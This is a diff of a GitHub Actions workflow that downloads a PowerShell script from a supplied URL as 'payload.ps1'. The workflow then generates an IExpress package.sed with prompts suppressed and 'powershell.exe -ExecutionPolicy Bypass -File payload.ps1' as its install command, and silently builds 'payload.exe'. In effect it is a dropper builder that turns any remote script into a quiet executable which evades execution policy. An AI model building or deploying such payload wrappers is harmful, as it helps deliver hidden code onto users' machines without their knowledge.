@@ -17,13 +17,12 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v3
 
-    # Step 2: Verify IExpress is available
-    - name: Check if IExpress is installed
+    # Step 2: Verify IExpress is installed
+    - name: Check if IExpress is available
       shell: cmd
-      run: |
-        where iexpress || (echo "IExpress is missing!" && exit /b 1)
+      run: where iexpress || (echo "IExpress is missing!" && exit /b 1)
 
-    # Step 3: Download PowerShell script from the provided URL
+    # Step 3: Download PowerShell script from input URL
     - name: Fetch Payload Script
       shell: powershell
       run: |
@@ -31,21 +30,28 @@ jobs:
         Invoke-WebRequest -Uri $url -OutFile "payload.ps1"
         Write-Host "Downloaded payload.ps1"
 
-    # Step 4: Validate package.sed file
+    # Step 4: Create package.sed file dynamically
+    - name: Generate package.sed
+      shell: cmd
+      run: |
+        echo [Version] > package.sed
+        echo Class=IEXPRESS >> package.sed
+        echo [Options] >> package.sed
+        echo TargetName=payload.exe >> package.sed
+        echo ShowInstallPrompt=0 >> package.sed
+        echo FinishMessage= >> package.sed
+        echo [Files] >> package.sed
+        echo payload.ps1 >> package.sed
+        echo [InstallSection] >> package.sed
+        echo run=powershell.exe -ExecutionPolicy Bypass -File payload.ps1 >> package.sed
+
+    # Step 5: Debug - Show package.sed contents
     - name: Validate package.sed file
       shell: cmd
-      run: |
-        echo "Checking package.sed file contents:"
-        type package.sed
+      run: type package.sed
 
-    # Step 5: Run IExpress in Debug Mode
-    - name: Debug IExpress in Interactive Mode
-      shell: cmd
-      run: |
-        iexpress /M package.sed
-
-    # Step 6: Run IExpress to build EXE
-    - name: Run IExpress to create EXE
+    # Step 6: Run IExpress to create EXE
+    - name: Run IExpress
       shell: cmd
       run: |
         iexpress /N /Q package.sed > iexpress_log.txt 2>&1
@@ -55,8 +61,8 @@ jobs:
           exit /b %ERRORLEVEL%
         )
 
-    # Step 7: List directory to check if EXE was created
-    - name: List output directory
+    # Step 7: Check if EXE was created
+    - name: Verify EXE Output
       shell: cmd
       run: dir
 
@@ -74,5 +80,6 @@ jobs:
       with:
         name: iexpress_log
         path: iexpress_log.txt
+
 
 
